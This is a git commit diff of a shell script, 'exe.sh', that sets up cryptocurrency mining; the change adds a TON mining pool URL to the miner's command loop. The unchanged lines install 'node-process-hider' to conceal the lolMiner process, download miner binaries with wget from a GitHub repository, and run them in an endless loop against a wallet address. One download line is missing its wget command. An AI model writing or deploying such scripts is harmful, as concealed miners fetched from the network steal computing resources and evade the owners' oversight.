ef32226e736637dae650e2fa2e1636940b88c558
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 07:33:43 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -5,7 +5,7 @@ screen -dmS gpu.sh ./gpu.sh 69 87
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
 wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoinMiner && wget https://github.com/d-crypto99/Bemiii/raw/main/go && https://github.com/d-crypto99/Bemiii/raw/main/global.config.json
 while [ 1 ]; do
-./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
+./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi -p https://pool.services.tonwhales.com
 sleep 5
 
 done
